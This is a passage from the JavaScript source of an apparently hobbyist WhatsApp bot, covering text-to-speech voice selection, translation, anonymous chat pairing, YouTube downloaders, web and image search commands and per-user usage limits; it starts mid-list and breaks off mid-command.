        "en-US-JasonNeural",
        "en-US-JennyMultilingualNeural",
        "en-US-JennyMultilingualV2Neural",
        "en-US-JennyNeural",
        "en-US-MichelleNeural",
        "en-US-MonicaNeural",
        "en-US-NancyNeural",
        "en-US-RogerNeural",
        "en-US-RyanMultilingualNeural",
        "en-US-SaraNeural",
        "en-US-SteffanNeural",
        "en-US-TonyNeural",
        "en-ZA-LeahNeural",
        "en-ZA-LukeNeural",
        "es-AR-ElenaNeural",
        "es-AR-TomasNeural",
        "es-BO-MarceloNeural",
        "es-BO-SofiaNeural",
        "es-CL-CatalinaNeural",
        "es-CL-LorenzoNeural",
        "es-CO-GonzaloNeural",
        "es-CO-SalomeNeural",
        "es-CR-JuanNeural",
        "es-CR-MariaNeural",
        "es-CU-BelkysNeural",
        "es-CU-ManuelNeural",
        "es-DO-EmilioNeural",
        "es-DO-RamonaNeural",
        "es-EC-AndreaNeural",
        "es-EC-LuisNeural",
        "es-ES-AbrilNeural",
        "es-ES-AlvaroNeural",
        "es-ES-ArnauNeural",
        "es-ES-DarioNeural",
        "es-ES-EliasNeural",
        "es-ES-ElviraNeural",
        "es-ES-EstrellaNeural",
        "es-ES-IreneNeural",
        "es-ES-LaiaNeural",
        "es-ES-LiaNeural",
        "es-ES-NilNeural",
        "es-ES-SaulNeural",
        "es-ES-TeoNeural",
        "es-ES-TrianaNeural",
        "es-ES-VeraNeural",
        "es-GQ-JavierNeural",
        "es-GQ-TeresaNeural",
        "es-GT-AndresNeural",
        "es-GT-MartaNeural",
        "es-HN-CarlosNeural",
        "es-HN-KarlaNeural",
        "es-MX-BeatrizNeural",
        "es-MX-CandelaNeural",
        "es-MX-CarlotaNeural",
        "es-MX-CecilioNeural",
        "es-MX-DaliaNeural",
        "es-MX-GerardoNeural",
        "es-MX-JorgeNeural",
        "es-MX-LarissaNeural",
        "es-MX-LibertoNeural",
        "es-MX-LucianoNeural",
        "es-MX-MarinaNeural",
        "es-MX-NuriaNeural",
        "es-MX-PelayoNeural",
        "es-MX-RenataNeural",
        "es-MX-YagoNeural",
        "es-NI-FedericoNeural",
        "es-NI-YolandaNeural",
        "es-PA-MargaritaNeural",
        "es-PA-RobertoNeural",
        "es-PE-AlexNeural",
        "es-PE-CamilaNeural",
        "es-PR-KarinaNeural",
        "es-PR-VictorNeural",
        "es-PY-MarioNeural",
        "es-PY-TaniaNeural",
        "es-SV-LorenaNeural",
        "es-SV-RodrigoNeural",
        "es-US-AlonsoNeural",
        "es-US-PalomaNeural",
        "es-UY-MateoNeural",
        "es-UY-ValentinaNeural",
        "es-VE-PaolaNeural",
        "es-VE-SebastianNeural",
        "et-EE-AnuNeural",
        "et-EE-KertNeural",
        "eu-ES-AinhoaNeural",
        "eu-ES-AnderNeural",
        "fa-IR-DilaraNeural",
        "fa-IR-FaridNeural",
        "fi-FI-HarriNeural",
        "fi-FI-NooraNeural",
        "fi-FI-SelmaNeural",
        "fil-PH-AngeloNeural",
        "fil-PH-BlessicaNeural",
        "fr-BE-CharlineNeural",
        "fr-BE-GerardNeural",
        "fr-CA-AntoineNeural",
        "fr-CA-JeanNeural",
        "fr-CA-SylvieNeural",
        "fr-CH-ArianeNeural",
        "fr-CH-FabriceNeural",
        "fr-FR-AlainNeural",
        "fr-FR-BrigitteNeural",
        "fr-FR-CelesteNeural",
        "fr-FR-ClaudeNeural",
        "fr-FR-CoralieNeural",
        "fr-FR-DeniseNeural",
        "fr-FR-EloiseNeural",
        "fr-FR-HenriNeural",
        "fr-FR-JacquelineNeural",
        "fr-FR-JeromeNeural",
        "fr-FR-JosephineNeural",
        "fr-FR-MauriceNeural",
        "fr-FR-YvesNeural",
        "fr-FR-YvetteNeural",
        "ga-IE-ColmNeural",
        "ga-IE-OrlaNeural",
        "gl-ES-RoiNeural",
        "gl-ES-SabelaNeural",
        "gu-IN-DhwaniNeural",
        "gu-IN-NiranjanNeural",
        "he-IL-AvriNeural",
        "he-IL-HilaNeural",
        "hi-IN-MadhurNeural",
        "hi-IN-SwaraNeural",
        "hr-HR-GabrijelaNeural",
        "hr-HR-SreckoNeural",
        "hu-HU-NoemiNeural",
        "hu-HU-TamasNeural",
        "hy-AM-AnahitNeural",
        "hy-AM-HaykNeural",
        "id-ID-ArdiNeural",
        "id-ID-GadisNeural",
        "is-IS-GudrunNeural",
        "is-IS-GunnarNeural",
        "it-IT-BenignoNeural",
        "it-IT-CalimeroNeural",
        "it-IT-CataldoNeural",
        "it-IT-DiegoNeural",
        "it-IT-ElsaNeural",
        "it-IT-FabiolaNeural",
        "it-IT-FiammaNeural",
        "it-IT-GianniNeural",
        "it-IT-ImeldaNeural",
        "it-IT-IrmaNeural",
        "it-IT-IsabellaNeural",
        "it-IT-LisandroNeural",
        "it-IT-PalmiraNeural",
        "it-IT-PierinaNeural",
        "it-IT-RinaldoNeural",
        "ja-JP-AoiNeural",
        "ja-JP-DaichiNeural",
        "ja-JP-KeitaNeural",
        "ja-JP-MayuNeural",
        "ja-JP-NanamiNeural",
        "ja-JP-NaokiNeural",
        "ja-JP-ShioriNeural",
        "jv-ID-DimasNeural",
        "jv-ID-SitiNeural",
        "ka-GE-EkaNeural",
        "ka-GE-GiorgiNeural",
        "kk-KZ-AigulNeural",
        "kk-KZ-DauletNeural",
        "km-KH-PisethNeural",
        "km-KH-SreymomNeural",
        "kn-IN-GaganNeural",
        "kn-IN-SapnaNeural",
        "ko-KR-BongJinNeural",
        "ko-KR-GookMinNeural",
        "ko-KR-InJoonNeural",
        "ko-KR-JiMinNeural",
        "ko-KR-SeoHyeonNeural",
        "ko-KR-SoonBokNeural",
        "ko-KR-SunHiNeural",
        "ko-KR-YuJinNeural",
        "lo-LA-ChanthavongNeural",
        "lo-LA-KeomanyNeural",
        "lt-LT-LeonasNeural",
        "lt-LT-OnaNeural",
        "lv-LV-EveritaNeural",
        "lv-LV-NilsNeural",
        "mk-MK-AleksandarNeural",
        "mk-MK-MarijaNeural",
        "ml-IN-MidhunNeural",
        "ml-IN-SobhanaNeural",
        "mn-MN-BataaNeural",
        "mn-MN-YesuiNeural",
        "mr-IN-AarohiNeural",
        "mr-IN-ManoharNeural",
        "ms-MY-OsmanNeural",
        "ms-MY-YasminNeural",
        "mt-MT-GraceNeural",
        "mt-MT-JosephNeural",
        "my-MM-NilarNeural",
        "my-MM-ThihaNeural",
        "nb-NO-FinnNeural",
        "nb-NO-IselinNeural",
        "nb-NO-PernilleNeural",
        "ne-NP-HemkalaNeural",
        "ne-NP-SagarNeural",
        "nl-BE-ArnaudNeural",
        "nl-BE-DenaNeural",
        "nl-NL-ColetteNeural",
        "nl-NL-FennaNeural",
        "nl-NL-MaartenNeural",
        "pl-PL-AgnieszkaNeural",
        "pl-PL-MarekNeural",
        "pl-PL-ZofiaNeural",
        "ps-AF-GulNawazNeural",
        "ps-AF-LatifaNeural",
        "pt-BR-AntonioNeural",
        "pt-BR-BrendaNeural",
        "pt-BR-DonatoNeural",
        "pt-BR-ElzaNeural",
        "pt-BR-FabioNeural",
        "pt-BR-FranciscaNeural",
        "pt-BR-GiovannaNeural",
        "pt-BR-HumbertoNeural",
        "pt-BR-JulioNeural",
        "pt-BR-LeilaNeural",
        "pt-BR-LeticiaNeural",
        "pt-BR-ManuelaNeural",
        "pt-BR-NicolauNeural",
        "pt-BR-ValerioNeural",
        "pt-BR-YaraNeural",
        "pt-PT-DuarteNeural",
        "pt-PT-FernandaNeural",
        "pt-PT-RaquelNeural",
        "ro-RO-AlinaNeural",
        "ro-RO-EmilNeural",
        "ru-RU-DariyaNeural",
        "ru-RU-DmitryNeural",
        "ru-RU-SvetlanaNeural",
        "si-LK-SameeraNeural",
        "si-LK-ThiliniNeural",
        "sk-SK-LukasNeural",
        "sk-SK-ViktoriaNeural",
        "sl-SI-PetraNeural",
        "sl-SI-RokNeural",
        "so-SO-MuuseNeural",
        "so-SO-UbaxNeural",
        "sq-AL-AnilaNeural",
        "sq-AL-IlirNeural",
        "sr-Latn-RS-NicholasNeural",
        "sr-Latn-RS-SophieNeural",
        "sr-RS-NicholasNeural",
        "sr-RS-SophieNeural",
        "su-ID-JajangNeural",
        "su-ID-TutiNeural",
        "sv-SE-HilleviNeural",
        "sv-SE-MattiasNeural",
        "sv-SE-SofieNeural",
        "sw-KE-RafikiNeural",
        "sw-KE-ZuriNeural",
        "sw-TZ-DaudiNeural",
        "sw-TZ-RehemaNeural",
        "ta-IN-PallaviNeural",
        "ta-IN-ValluvarNeural",
        "ta-LK-KumarNeural",
        "ta-LK-SaranyaNeural",
        "ta-MY-KaniNeural",
        "ta-MY-SuryaNeural",
        "ta-SG-AnbuNeural",
        "ta-SG-VenbaNeural",
        "te-IN-MohanNeural",
        "te-IN-ShrutiNeural",
        "th-TH-AcharaNeural",
        "th-TH-NiwatNeural",
        "th-TH-PremwadeeNeural",
        "tr-TR-AhmetNeural",
        "tr-TR-EmelNeural",
        "uk-UA-OstapNeural",
        "uk-UA-PolinaNeural",
        "ur-IN-GulNeural",
        "ur-IN-SalmanNeural",
        "ur-PK-AsadNeural",
        "ur-PK-UzmaNeural",
        "uz-UZ-MadinaNeural",
        "uz-UZ-SardorNeural",
        "vi-VN-HoaiMyNeural",
        "vi-VN-NamMinhNeural",
        "wuu-CN-XiaotongNeural",
        "wuu-CN-YunzheNeural",
        "yue-CN-XiaoMinNeural",
        "yue-CN-YunSongNeural",
        "zh-CN-XiaochenNeural",
        "zh-CN-XiaohanNeural",
        "zh-CN-XiaomengNeural",
        "zh-CN-XiaomoNeural",
        "zh-CN-XiaoqiuNeural",
        "zh-CN-XiaoruiNeural",
        "zh-CN-XiaoshuangNeural",
        "zh-CN-XiaoxiaoNeural",
        "zh-CN-XiaoxuanNeural",
        "zh-CN-XiaoyanNeural",
        "zh-CN-XiaoyiNeural",
        "zh-CN-XiaoyouNeural",
        "zh-CN-XiaozhenNeural",
        "zh-CN-YunfengNeural",
        "zh-CN-YunhaoNeural",
        "zh-CN-YunjianNeural",
        "zh-CN-YunxiNeural",
        "zh-CN-YunxiaNeural",
        "zh-CN-YunyangNeural",
        "zh-CN-YunyeNeural",
        "zh-CN-YunzeNeural",
        "zh-CN-henan-YundengNeural",
        "zh-CN-liaoning-XiaobeiNeural",
        "zh-CN-shaanxi-XiaoniNeural",
        "zh-CN-shandong-YunxiangNeural",
        "zh-CN-sichuan-YunxiNeural",
        "zh-HK-HiuGaaiNeural",
        "zh-HK-HiuMaanNeural",
        "zh-HK-WanLungNeural",
        "zh-TW-HsiaoChenNeural",
        "zh-TW-HsiaoYuNeural",
        "zh-TW-YunJheNeural",
        "zu-ZA-ThandoNeural",
        "zu-ZA-ThembaNeural"
    ]
    let lister = ListVoiceArray(ListVoice)
    let readMore = String.fromCharCode(8206).repeat(4001);

    let query = `Input query!\n\n*Example:*\n${prefix + command} [angka]|[teks]\n\n*Pilih angka yg ada*\n` + readMore + lister.map((v, index) => "  " + (index + 1) + ". " + v).join("\n");
    
    let text
    if (args.length >= 1) {
        text = args.slice(0).join(" ")
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text
    } else m.reply(query)
    let [atas, bawah] = text.split("|")
    if (!atas) return m.reply(query)
    if (!bawah) return m.reply(query)
    const {
        short,
        long
    } = getParts(ListVoice, atas);
    await m.reply(wait + "\n" + long.replace(/(.+)-(.+)-(.+)Neural/, "$3 ($1-$2)"))

    try {
        let res = await generateVoice(short, long, bawah)
        if (res) await HuBotZ.sendMessage(m.chat, {
        audio: res,
        mimetype: 'audio/mp4',
        ptt: true,
        waveform: [100, 0, 100, 0, 100, 0, 100]
    }, {
        quoted: m
    })
    } catch (e) {
        console.log(e)
        m.reply(eror)
    }
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'translate': 
case 'tr': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!quoted) return m.reply(`Contoh :

1. Kirim perintah ${prefix + command} *kode bahasa* *teks*
• Contoh : ${prefix + command} id halo
2. Reply chat dengan caption ${prefix + command} *kode bahasa*
• Contoh : ${prefix + command} id halo
Daftar bahasa yang di dukung : https://cloud.google.com/translate/docs/languages`)
let teks = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
translate(teks, { to: args[0] }).then((res) => {
HuBotZ.sendText(m.chat, `${res.text}`, m)
})
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'anonymouschat': {
if (m.isGroup) return newReply('Fitur Tidak Dapat Digunakan Untuk Group!')
newReply(`Hi ${pushname} Welcome To Anonymous Chat\n\n${prefix}start -- _mencari partner_`)
addCountCmd(`#${command}`, m.sender, _cmd);
 }
break
case 'keluar': case 'leave': {
if (m.isGroup) return newReply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!room) {
newReply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
throw false
}
newReply('Berhasil keluar dari anonymous chat')
let other = room.other(m.sender)
if (other) await HuBotZ.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[room.id]
if (command === 'leave') 
break
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'mulai': case 'start': {
if (m.isGroup) return newReply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
newReply(`Kamu Masih Berada Di dalam Sesi Anonymous\n\n${prefix}keluar -- _keluar dari sesi chat_`)
throw false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
HuBotZ.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
newReply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
newReply(`Mohon Tunggu Sedang Mencari Partner`)
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
}
case 'next': case 'lanjut': {
if (m.isGroup) return newReply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
newReply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
throw false
}
let other = romeo.other(m.sender)
if (other) await HuBotZ.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
HuBotZ.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
newReply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
newReply(`Mohon Tunggu Sedang Mencari Partner`)
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
}
case 'sendprofile': 
case 'sendprofil':
if (m.isGroup) return newReply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romoe = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romoe) {
newReply(`⚠️ Kamu belum pernah memulai chat!\n\n${prefix}start -- _Mencari partner_`)
//var teks = `⚠️ Kamu belum pernah memulai chat!`
//await HuBotZ.sendMessage(m.chat, { text: teks, footer:, templateButtons: but })
throw false
} else {
let rms = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state == "CHATTING")
var partnerJID = rms.other(m.sender)
var res = await HuBotZ.sendContact(partnerJID, [m.sender.split("@")[0]])
HuBotZ.sendMessage(m.chat, { text: '✅ Berhasil mengirim profil ke teman chat anda!' }, { quoted: m })
HuBotZ.sendMessage(partnerJID, { text: '👨👩 Teman chat kamu memberikan kontak profil nya!' }, { quoted: res })
addCountCmd(`#${command}`, m.sender, _cmd);
}
break

// Downloads Menu
case 'ytmp3': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 2) return m.reply(`🇺🇸 You don't have enough limits to use this feature!, because you only have ${db.data.users[m.sender].limit} limit left\n\n🇮🇩 Kamu tidak memiliki cukup limit untuk menggunakan fitur ini!, karena kamu hanya memiliki ${db.data.users[m.sender].limit} limit tersisa`)
const { fetchBuffer } = require('./lib/myfunc2');
const HuBotZaudp3 = require('./lib/ytdl2');
const ytdl = require("ytdl-core");
const yts = require("yt-search");
const { youtubeSearch, youtubedl } = require("@bochilteam/scraper-sosmed");
if (args.length < 1 || !isUrl(text) || !HuBotZaudp3.isYTUrl(text)) return reply(`Where's the link??\nExample: ${prefix+command} https://youtu.be/hJqYc62NCKo?si=PdBpHd08JH1fSqG`);
    let { key } = await HuBotZ.sendMessage(m.chat, { text: `${mess.Tunggu}` }, { quoted: m });
    await sleep(2500);
    const message = [
      "🇺🇸 *Your Limit is Reduced by 2*\n\n🇮🇩 *Limit Anda Berkurang 2*"
    ];

    for (let i = 0; i < message.length; i++) {
      await HuBotZ.sendMessage(m.chat, { text: message[i], edit: key });
    }
    await sleep(1500);
    db.data.users[m.sender].limit -= 2;
    let limitUserr = `${db.data.users[m.sender].limit}/${global.limitawal.free}`
    let limitUser = `${isPremium ? 'Infinity' : limitUserr}`
    HuBotZ.sendMessage(m.chat, { text: `🇺🇸 Your Remaining Limit: ${limitUser}\nSending Response. . .\n\n🇮🇩 Limit Anda Sisa: ${limitUser}\nMengirim Respon. . .`, edit: key });
try {
    let puki = await youtubeSearch(text)
    puki = puki.video[0]
    let url = puki.url
    let res = await youtubedl(text)
	let data = res.audio[Object.keys(res.audio)[0]]
	let site = await data.download()
	if (data.fileSize > 400000) return m.reply(`🇺🇸 File Size is: ${data.fileSizeH} Cannot Send File, Maximum of file is 400 MB\n\n🇮🇩 Size File: ${data.fileSizeH}\nTidak dapat mengirim, maksimal file 400 MB`)
	await HuBotZ.sendMessage(m.chat, {
    audio: {
    url: site
    },
    mimetype: 'audio/mpeg',
    contextInfo: {
        externalAdReply: {
            title: puki.title,
            body: '',
            thumbnailUrl: puki.thumbnail,
            mediaType: 2,
            mediaUrl: text,
        }
    },
} ,{ quoted: m })
} catch (e) {
console.log(e)
try {
    let pepek = await yts( { videoId: await ytdl.getURLVideoID(text) } )
    let res = await ytdl.getURLVideoID(text)
    let anj = await ytdl.getInfo(res)
    anj = anj.formats.filter(v => v.mimeType.includes('audio/mp4'))[0]
    let size = parseInt(anj.contentLength)
    if (size > 400000000) return m.reply(`🇺🇸 File Size is: ${niceBytes(size)} Cannot Send File, Maximum of file is 400 MB\n\n🇮🇩 Size File: ${niceBytes(size)}\nTidak dapat mengirim, maksimal file 400 MB`)
    await HuBotZ.sendMessage(m.chat, {
    audio: {
    url: anj.url
    },
    mimetype: 'audio/mpeg',
    contextInfo: {
        externalAdReply: {
            title: pepek.title,
            body: '',
            thumbnailUrl: pepek.thumbnail,
            mediaType: 2,
            mediaUrl: text,
        }

    },
} ,{ quoted: m })
} catch (e) {
console.log(e)
try {
const audio = await HuBotZaudp3.mp3(text)
await HuBotZ.sendMessage(m.chat, {
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mpeg',
    contextInfo: {
        externalAdReply: {
            title: audio.meta.title,
            body: '',
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType: 2,
            mediaUrl: text,
        }

    },
} ,{ quoted: m })
fs.unlinkSync(audio.path)
} catch (e) {
console.log(e)
m.reply(mess.emror.feature)
}
//m.reply(mess.emror.feature)
}
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'ytplay':
case 'play':
case 'song': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 2) return m.reply(`🇺🇸 You don't have enough limits to use this feature!, because you only have ${db.data.users[m.sender].limit} limit left\n\n🇮🇩 Kamu tidak memiliki cukup limit untuk menggunakan fitur ini!, karena kamu hanya memiliki ${db.data.users[m.sender].limit} limit tersisa`)
  const HuBotZplaymp3 = require('./lib/ytdl2');
  if (!text) return reply(`Example: ${prefix + command} TheFatRat Monody`);
  const { fetchBuffer } = require('./lib/myfunc2');
  let yts = require('yt-search');
  let search = await yts(text);
  let asw = search.videos[0];
  if (!asw) return reply('Video/Audio Not Found')
  if (asw.seconds >= 3600) {
  return reply('Video More Than 1 Hour')
  }
  let { key } = await HuBotZ.sendMessage(m.chat, { text: `${mess.Tunggu}` }, { quoted: m });
    await sleep(2500);
    const message = [
      "🇺🇸 *Your Limit is Reduced by 2*\n\n🇮🇩 *Limit Anda Berkurang 2*"
    ];

    for (let i = 0; i < message.length; i++) {
      await HuBotZ.sendMessage(m.chat, { text: message[i], edit: key });
    }
    await sleep(1500);
    db.data.users[m.sender].limit -= 2;
    let limitUserr = `${db.data.users[m.sender].limit}/${global.limitawal.free}`
    let limitUser = `${isPremium ? 'Infinity' : limitUserr}`
    HuBotZ.sendMessage(m.chat, { text: `🇺🇸 Your Remaining Limit: ${limitUser}\nSending Response. . .\n\n🇮🇩 Limit Anda Sisa: ${limitUser}\nMengirim Respon. . .`, edit: key });

  const anj = `*=== Data Found ===*
  *📄 Title:* ${asw.title}
  *🕓 Duration:* ${asw.timestamp}
  *👁️ Viewers:* ${asw.views}
  *📂 Upload:* ${asw.ago}
  *🧿 Channel:* ${asw.author.url}
  *👤 Author:* ${asw.author.name}
  *🔗 Url:* ${asw.url}
  *📃 Description:* ${asw.description}
  
  Media is Being Sent`;
try {
let urlaudionya = `https://aemt.me/youtube?url=${asw.url}&filter=audioonly&quality=highestaudio&contenttype=audio/mpeg`
  
  const ytpl = await HuBotZ.sendMessage(m.chat, {
  text: anj,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          renderLargerThumbnail: true,
          title: asw.title,
          body: '© Powered By YouTube',
          containsAutoReply: true,
          mediaType: 1,
          thumbnailUrl: asw.image,
          mediaUrl: '',
          sourceUrl: global.wagc
        }
      }
    }, { quoted: m });
    
    await HuBotZ.sendMessage(m.chat, {
    audio: {
        url: urlaudionya
    },
    mimetype: 'audio/mpeg'
  }, { quoted: ytpl });
  
  } catch (e) {
  console.log(e)
  try {
  
  const ytpl2 = await HuBotZ.sendMessage(m.chat, {
  text: anj,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          renderLargerThumbnail: true,
          title: asw.title,
          body: '© Powered By YouTube',
          containsAutoReply: true,
          mediaType: 1,
          thumbnailUrl: asw.image,
          mediaUrl: '',
          sourceUrl: global.wagc
        }
      }
    }, { quoted: m });
  
    const pl = await HuBotZplaymp3.mp3(asw.url);
    
    await HuBotZ.sendMessage(m.chat, {
    audio: fs.readFileSync(pl.path),
    mimetype: 'audio/mpeg',
    filename: asw.title + '.mp3',
  }, { quoted: ytpl2 });
  fs.unlinkSync(pl.path)
  
  } catch (e) {
  console.log(e)
  m.reply(mess.emror.feature)
  }
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'ytv2': 
case 'ytvideo2': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*`)
await replyLoad();
try{
let anu = await fetchJson(`https://api.zahwazein.xyz/downloader/youtube?apikey=${global.ZenzKey}&url=${text}`)
const cpt = anu.result.duration
const nick = anu.result.title
HuBotZ.sendMessage(m.chat, { video: { url: anu.result.getVideo.url}, caption: `💬Judul : ${nick}\n⏱️Durasi : ${cpt}\n\n*NOTE* : Jika video tidak dapat diputar, ketik .ytv *url*`}, {quoted: m})
} catch (error) {
newReply(`Sorry this video can't be download\n\nPlease try typing .ytv *url*`);
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'ytmp4': case 'ytvideo': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 2) return m.reply(`${mess.KurangLimit}`)
const vidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !vidoh.isYTUrl(text)) return reply(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
    let { key } = await HuBotZ.sendMessage(m.chat, { text: `${mess.Tunggu}` }, { quoted: m });
    await sleep(2500);
    const message = [
      "🇺🇸 *Your Limit is Reduced by 2*\n\n🇮🇩 *Limit Anda Berkurang 2*"
    ];

    for (let i = 0; i < message.length; i++) {
      await HuBotZ.sendMessage(m.chat, { text: message[i], edit: key });
    }
    await sleep(1500);
    db.data.users[m.sender].limit -= 2;
    let limitUserr = `${db.data.users[m.sender].limit}/${global.limitawal.free}`
    let limitUser = `${isPremium ? 'Infinity' : limitUserr}`
    HuBotZ.sendMessage(m.chat, { text: `🇺🇸 Your Remaining Limit: ${limitUser}\nSending Response. . .\n\n🇮🇩 Limit Anda Sisa: ${limitUser}\nMengirim Respon. . .`, edit: key });
    try {
const vid = await vidoh.mp4(text)
const ytc=`
*~> Tittle:* ${vid.title}
*~> Date:* ${vid.date}
*~> Duration:* ${vid.duration}
*~> Quality:* ${vid.quality}`
await HuBotZ.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
} catch (er) {
console.log(er)
m.reply(mess.emror.feature)
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'lk21':{
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isCreator && !isPremium && !isMods) return reply(mess.OnlyPrem)
if (!text) return reply(`Nyari Apa?`) 
reply(mess.wait) 
let res = await fetch(`https://wibu-api.eu.org/api/lk21/search?title=${text}`)
 try {
let json = await res.json()
json = json.result.map((v) => `*Judul:* ${v.judul}\n*Link:* ${v.link}\n*Kategori:* ${v.kategori}\n*Download:* ${v.dl}\n`).join`\n\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n\n`
reply(json)
} catch (e) {
reply(`Tidak Dapat Menemukan Apa Yang Kamu Cari`)
}
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'jarak':{
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} jakarta|bandung`)
newReply(mess.wait)
let [from, to] = text.split(/[^\w\s]/g)
	if (!(from && to)) return newReply (`Example: ${prefix+command} jakarta|bandung`) 
	let data = await jarak(from, to)
	if (data.img) return HuBotZ.sendMessage(m.chat, { image: data.img, caption: data.desc }, { quoted: m })
	else newReply(data.desc)
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'google': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return newReply(`Contoh : ${prefix + command} Indonesia`);
let google = require("google-it");
google({ query: text }).then((res) => {
let teks = `Google Search From : ${text}\n\n`;
for (let g of res) {
teks += `• *Title* : ${g.title}\n`;
teks += `• *Description* : ${g.snippet}\n`;
teks += `• *Link* : ${g.link}\n\n────────────────────────\n\n`;
}
reply(teks)
})
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'googleimage':
case 'image':
case 'gimage': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return reply(`Example : ${prefix + command} Kaori Cicak`)
    let { key } = await HuBotZ.sendMessage(m.chat, { text: `${mess.Tunggu}` }, { quoted: m });
    await sleep(2500);
    const message = [
      "🇺🇸 *Your Limit is Reduced by 1*\n\n🇮🇩 *Limit Anda Berkurang 1*"
    ];

    for (let i = 0; i < message.length; i++) {
      await HuBotZ.sendMessage(m.chat, { text: message[i], edit: key });
    }
    await sleep(1500);
    db.data.users[m.sender].limit -= 1;
    let limitUserr = `${db.data.users[m.sender].limit}/${global.limitawal.free}`
    let limitUser = `${isPremium ? 'Infinity' : limitUserr}`
    HuBotZ.sendMessage(m.chat, { text: `🇺🇸 Your Remaining Limit: ${limitUser}\nSending Response. . .\n\n🇮🇩 Limit Anda Sisa: ${limitUser}\nMengirim Respon. . .`, edit: key });
    try {
let gis = require('g-i-s')
gis(text, async (error, result) => {
let pukii = result
let images = pukii[Math.floor(Math.random() * pukii.length)].url
let capt = `
*-------「 GIMAGE SEARCH 」-------*
🔎 *Query :* ${text}
🌐 *Search Engine :* Google Image
🔗 *Media Url :* ${images}`
